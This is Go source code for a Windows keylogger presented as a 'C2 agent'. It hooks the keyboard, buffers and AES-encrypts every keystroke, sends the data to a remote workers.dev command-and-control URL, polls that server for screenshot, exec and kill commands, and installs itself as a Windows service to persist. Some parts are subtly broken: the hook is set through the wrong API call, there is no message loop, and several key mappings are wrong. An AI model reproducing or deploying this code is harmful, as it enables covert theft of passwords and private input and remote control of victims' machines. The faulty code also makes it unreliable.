package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kardianos/service"
)

const (
	workerURL      = "https://quantum-c2-worker.ns8pc1.workers.dev/api/v1/keystrokes"
	apiKey         = "REPLACE_WITH_API_KEY"
	aesKey         = "REPLACE_WITH_32_BYTE_AES_KEY_1234567890123456"
	agentID        = "agent-001"
	ringBufferSize = 65536
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
	VK_SHIFT       = 0x10
	VK_LSHIFT      = 0xA0
	VK_RSHIFT      = 0xA1
	VK_CONTROL     = 0x11
	VK_MENU        = 0x12
)

var (
	installFlag  = flag.Bool("install", false, "install as Windows service")
	runFlag      = flag.Bool("run", false, "run directly")
	uninstallFlag = flag.Bool("uninstall", false, "uninstall service")
)

type Keystroke struct {
	Key      uint32 `json:"key"`
	Unicode  string `json:"unicode"`
	Alt      bool   `json:"alt"`
	Ctrl     bool   `json:"ctrl"`
	Shift    bool   `json:"shift"`
	Extended bool   `json:"extended"`
	Time     int64  `json:"time"`
}

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type HHOOK uintptr

type RingBuffer struct {
	buf  []byte
	head int
	tail int
	size int
	mu   sync.Mutex
}

func NewRingBuffer(capacity int) *RingBuffer {
	return &RingBuffer{buf: make([]byte, capacity), size: capacity}
}

func (r *RingBuffer) Write(data []byte) int {
	r.mu.Lock()
	defer r.mu.Unlock()
	n := copy(r.buf[r.head:], data)
	r.head += n
	if r.head >= r.size {
		r.head -= r.size
	}
	if r.head == r.tail && r.buf[r.tail] != 0 {
		r.tail = (r.tail + 1) % r.size
	}
	return n
}

func (r *RingBuffer) Read() []byte {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.head == r.tail {
		return nil
	}
	var result []byte
	for r.tail != r.head {
		result = append(result, r.buf[r.tail])
		r.tail++
		if r.tail >= r.size {
			r.tail -= r.size
		}
	}
	r.head = 0
	r.tail = 0
	return result
}

func (r *RingBuffer) Reset() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.head = 0
	r.tail = 0
}

type Payload struct {
	Encrypted string `json:"encrypted"`
	ID        string `json:"id"`
	Ts        int64  `json:"ts"`
}

type Command struct {
	Command string `json:"command"`
	Data    string `json:"data"`
	Delay   int    `json:"delay"`
}

var (
	keyBuf       = NewRingBuffer(ringBufferSize)
	hhk          HHOOK
	user32DLL    *syscall.LazyDLL
	procCallNextHookEx *syscall.LazyProc
	procUnhookWindowsHookEx *syscall.LazyProc
	kernel32DLL  *syscall.LazyDLL
	procGetAsyncKeyState *syscall.LazyProc
	procGetModuleHandle *syscall.LazyProc
)

func getModuleHandle() uintptr {
	if procGetModuleHandle == nil {
		kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
		procGetModuleHandle = kernel32DLL.NewProc("GetModuleHandleW")
	}
	ret, _, _ := procGetModuleHandle.Call(0)
	return ret
}

func getAsyncKeyState(vk uint32) int32 {
	if procGetAsyncKeyState == nil {
		user32DLL = syscall.NewLazyDLL("user32.dll")
		procGetAsyncKeyState = user32DLL.NewProc("GetAsyncKeyState")
	}
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return int32(ret)
}

func lowLevelKeyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		ks := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		isAlt := (ks.Flags&0x20) != 0
		isCtrl := (ks.Flags&0x04) != 0 || (ks.Flags&0x08) != 0
		isShift := (getAsyncKeyState(VK_SHIFT)&0x8000) != 0 ||
			(getAsyncKeyState(VK_LSHIFT)&0x8000) != 0 ||
			(getAsyncKeyState(VK_RSHIFT)&0x8000) != 0
		isExtended := (ks.Flags&0x01) != 0
		key := ks.VkCode
		unicode := keyToUnicode(key, isAlt, isShift)
		if unicode != "" || key > 0 {
			ks2 := Keystroke{
				Key: key, Unicode: unicode, Alt: isAlt,
				Ctrl: isCtrl, Shift: isShift, Extended: isExtended,
				Time: time.Now().UnixMilli(),
			}
			data, _ := json.Marshal(ks2)
			data = append(data, '\n')
			keyBuf.Write(data)
		}
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func keyToUnicode(vk uint32, alt bool, shift bool) string {
	if vk >= 0x41 && vk <= 0x5A {
		if shift {
			return string(rune(vk - 0x41 + 'A'))
		}
		return string(rune(vk - 0x41 + 'a'))
	}
	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			return string(rune(vk - 0x30 + ')'))
		}
		return string(rune(vk - 0x30 + '0'))
	}
	switch vk {
	case 0x0D: return "\n"
	case 0x08: return "\b"
	case 0x09: return "\t"
	case 0x20: return " "
	case 0xBC: if shift { return "<" }; return ","
	case 0xBD: if shift { return ">" }; return "."
	case 0xBE: if shift { return "\"" }; return "/"
	case 0xC0: if shift { return "~" }; return "`"
	case 0xDB: if shift { return "{" }; return "["
	case 0xDC: if shift { return "}" }; return "\\"
	case 0xDD: if shift { return "|" }; return "]"
	case 0xDE: if shift { return ":" }; return ";"
	case 0xBF: if shift { return "?" }; return "/"
	case 0xBA: if shift { return "+" }; return ";"
	case 0xBB: if shift { return "+" }; return "="
	}
	return ""
}

func setHook() error {
	user32DLL = syscall.NewLazyDLL("user32.dll")
	procCallNextHookEx = user32DLL.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")

	hInstance := getModuleHandle()
	cb := syscall.NewCallback(lowLevelKeyboardProc)
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(WH_KEYBOARD_LL), cb, hInstance, 0)
	hhk = HHOOK(ret)
	if hhk == 0 {
		return fmt.Errorf("failed to set hook")
	}
	return nil
}

func removeHook() {
	if hhk != 0 {
		procUnhookWindowsHookEx.Call(uintptr(hhk))
		hhk = 0
	}
}

func encrypt(plaintext []byte) (string, error) {
	block, err := aes.NewCipher([]byte(aesKey))
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptPayload(ciphertextStr string) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(ciphertextStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher([]byte(aesKey))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func sendData(encrypted string) error {
	payload := Payload{Encrypted: encrypted, ID: agentID, Ts: time.Now().Unix()}
	data, _ := json.Marshal(payload)
	resp, err := http.Post(workerURL, "application/json", bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned %d", resp.StatusCode)
	}
	return nil
}

func fetchCommands() (*Command, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("GET", workerURL, nil)
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("X-Agent-ID", agentID)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	var cmd Command
	if err := json.Unmarshal(body, &cmd); err != nil {
		return nil, err
	}
	return &cmd, nil
}

func runAgent() {
	log.SetOutput(os.Stdout)
	log.Println("Quantum C2 Agent starting...")
	log.Printf("Agent ID: %s | Worker: %s", agentID, workerURL)

	if err := setHook(); err != nil {
		log.Fatalf("Failed to set keyboard hook: %v", err)
	}
	defer removeHook()

	pollInterval := 1 * time.Second
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)

	go func() {
		for range ch {
			log.Println("Shutdown signal received, cleaning up...")
			removeHook()
			os.Exit(0)
		}
	}()

	for range ticker.C {
		data := keyBuf.Read()
		if len(data) > 0 {
			encrypted, err := encrypt(data)
			if err != nil {
				log.Printf("Encryption error: %v", err)
				continue
			}
			if err := sendData(encrypted); err != nil {
				log.Printf("Send error: %v, backing off", err)
				pollInterval = minDuration(pollInterval*2, 300*time.Second)
				ticker.Reset(pollInterval)
				continue
			}
			keyBuf.Reset()
			pollInterval = 1 * time.Second
			ticker.Reset(pollInterval)
		}

		cmd, err := fetchCommands()
		if err == nil && cmd != nil && cmd.Command != "" {
			log.Printf("Received command: %s", cmd.Command)
			if cmd.Delay > 0 {
				time.Sleep(time.Duration(cmd.Delay) * time.Second)
			}
			switch cmd.Command {
			case "screenshot":
				takeScreenshot()
			case "exec":
				executeRemote(cmd.Data)
			case "kill":
				os.Exit(0)
			}
		}
	}
}

func takeScreenshot() { log.Println("[CMD] screenshot") }
func executeRemote(data string) { log.Printf("[CMD] exec: %s", data) }

func minDuration(a, b time.Duration) time.Duration {
	if a < b { return a }; return b
}

type program struct{}

func (p *program) Start(s service.Service) error { go p.run(); return nil }
func (p *program) run() { runAgent() }
func (p *program) Stop(s service.Service) error { removeHook(); return nil }

func main() {
	flag.Parse()
	svcConfig := &service.Config{
		Name:        "QuantumC2Agent",
		DisplayName: "Quantum C2 Elite Viper Agent",
		Description: "Quantum C2 Elite Viper - Keylogging Agent Service",
	}

	if *installFlag {
		s, err := service.New(&program{}, svcConfig)
		if err != nil { log.Fatalf("Failed to create service: %v", err) }
		if err := s.Install(); err != nil { log.Fatalf("Failed to install: %v", err) }
		log.Println("Service installed successfully")
		return
	}
	if *uninstallFlag {
		s, err := service.New(&program{}, svcConfig)
		if err != nil { log.Fatalf("Failed to create service: %v", err) }
		if err := s.Uninstall(); err != nil { log.Fatalf("Failed to uninstall: %v", err) }
		log.Println("Service uninstalled successfully")
		return
	}
	if *runFlag {
		runAgent()
		return
	}
	s, err := service.New(&program{}, svcConfig)
	if err != nil { log.Fatalf("Failed to start service: %v", err) }
	if err := s.Run(); err != nil { log.Fatalf("Service run error: %v", err) }
}
